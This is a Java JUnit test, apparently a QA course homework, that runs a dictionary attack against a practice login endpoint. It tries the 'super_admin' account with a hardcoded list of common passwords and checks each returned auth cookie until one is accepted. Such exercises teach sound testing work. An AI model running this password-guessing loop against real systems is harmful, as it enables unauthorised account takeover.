import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.fail;

public class SecretPasswordTest {

    private static final String LOGIN = "super_admin";
    private static final String GET_PASSWORD_URL =
            "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
    private static final String CHECK_COOKIE_URL =
            "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

    // Distinct passwords from "Top 25 most common passwords by year
    // according to SplashData" (Wikipedia, 2011-2019 columns)
    private static final List<String> PASSWORDS = Arrays.asList(
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "abc123", "football", "monkey",
            "letmein", "shadow", "master", "666666", "qwertyuiop",
            "123321", "mustang", "1234567890", "michael", "654321",
            "superman", "1qaz2wsx", "7777777", "121212", "000000",
            "qazwsx", "123qwe", "killer", "trustno1", "jordan",
            "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
            "soccer", "harley", "batman", "andrew", "tigger",
            "sunshine", "iloveyou", "2000", "charlie", "robert",
            "thomas", "hockey", "ranger", "daniel", "starwars",
            "klaster", "112233", "george", "computer", "michelle",
            "jessica", "pepper", "1111", "zxcvbn", "555555",
            "11111111", "131313", "freedom", "777777", "pass",
            "maggie", "159753", "aaaaaa", "ginger", "princess",
            "joshua", "cheese", "amanda", "summer", "love",
            "ashley", "nicole", "chelsea", "biteme", "matthew",
            "access", "yankees", "987654321", "dallas", "austin",
            "thunder", "taylor", "matrix", "welcome", "admin",
            "1234567890", "1234abcd", "p@ssw0rd", "passw0rd", "starwars",
            "adobe123", "photoshop", "1q2w3e4r", "1q2w3e", "qwerty123",
            "donald", "password1", "qwertyuiop", "hello", "whatever",
            "flower", "hottie", "loveme", "zaq1zaq1", "solo",
            "login", "jesus", "ninja", "696969", "aa123456"
    );

    @Test
    public void testFindSecretPassword() {
        for (String password : PASSWORDS) {
            // 1) Request an auth cookie for this login/password pair
            Response authResponse = RestAssured
                    .given()
                    .formParam("login", LOGIN)
                    .formParam("password", password)
                    .when()
                    .post(GET_PASSWORD_URL)
                    .andReturn();

            String authCookie = authResponse.getCookie("auth_cookie");

            // 2) Validate the cookie against the check method
            Response checkResponse = RestAssured
                    .given()
                    .cookie("auth_cookie", authCookie)
                    .when()
                    .get(CHECK_COOKIE_URL)
                    .andReturn();

            String checkText = checkResponse.getBody().asString();

            if (!checkText.equals("You are NOT authorized")) {
                System.out.println("Password found: " + password);
                System.out.println("Response: " + checkText);
                return;
            }
        }

        fail("Password was not found in the provided list");
    }
}
